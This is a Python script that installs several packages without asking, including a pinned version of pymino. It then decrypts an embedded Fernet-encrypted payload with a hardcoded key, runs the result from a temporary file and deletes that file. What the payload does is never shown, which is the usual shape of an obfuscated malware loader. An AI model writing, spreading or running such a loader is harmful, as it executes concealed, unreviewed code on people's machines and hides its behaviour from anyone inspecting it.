# -*- coding: utf-8 -*-
# Self-decrypting Python script

import subprocess
import sys
import importlib.util
import base64
import tempfile
import os

def ensure_package(module, pip_name):
    if importlib.util.find_spec(module) is None:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])

ensure_package("cryptography", "cryptography")
ensure_package("colorama", "colorama")
ensure_package("pymino", "pymino==1.3.4.7")

from cryptography.fernet import Fernet

key = b'9IFX-lDj3CyDJuOBqqjvBpFGZSbi_gVp5jiEJsQ7gQs='
encrypted_code = b'gAAAAABoiQQphqcUt_u2XTVcfmG0KqJnMkL0XK_tBA0FEOCjZVXEZwcIQHf489JTEnQLfqf-qqAyk6NKD3z2q0B3H5QUolJELAYjavFxgNSjbclD3oaFu7XZvs5jO0cg3n3boluatlRYsfjJCAvmTzfNs9YzxAYor8dHxCXIiXXzmK5SbQF33hYku2H_NsvFPXPG4yZ2eBG4JkENzL3K3g1SJ5wYACzF6tCR5QJEuR1aFex0z18_yTsr9q9RRDjyF4cNRRbu2O4f-Sy7zzDV7v9Kmz78QIrVnlMd8mGMAEgK_78Va9QZbNf3mTWQ1MXZqJ9sBDdIRJlwwdke6w2PV7laEuWcJIbVYN7hnR9k9-SlhlN_X6tDmhhPOF0HiayHKycZdLwyPWRQE_hNMvT1eNhmRBa4IBCVgkQ2xMKLYrZ17OV2O-VaODsH2tiz3I5lbICAbVvSWzBhXKDp6nxs729WJ5UJAsxwRxceF6j37jZNsy5Hw0NfUb_-Br35tvbB1dvUwyyo2ZRgGojMIG5k1WFEq-p9GYWqW1pkFafs9kuVKxDcw21sm7L1YVsmiHQb3wbX7f5R_JneyAMyG4hAyVXFCT2szKxi5bhH-E8eXcTeWQKfaUafFvNBm_xPss5237Q0s1QiQ6NgVjCnMbnYjomw1Yyx09jpGceuNotrYeWcWlGz0chWInvXPhTxHiyg0Ag9WK4p5JV-tA5PmMUp1-PfDav6e8Tz-3NNsWhXO2uZcBFMGKifObZNCwxy6xur0-BuoUQRlZXW2GU4mek9fNcerOTl6eaU4Q=='

def decrypt_and_run():
    f = Fernet(key)
    code = f.decrypt(encrypted_code).decode()

    with tempfile.NamedTemporaryFile("w", delete=False, suffix=".py") as temp:
        temp.write(code)
        temp_path = temp.name

    subprocess.run([sys.executable, temp_path])
    os.remove(temp_path)

decrypt_and_run()
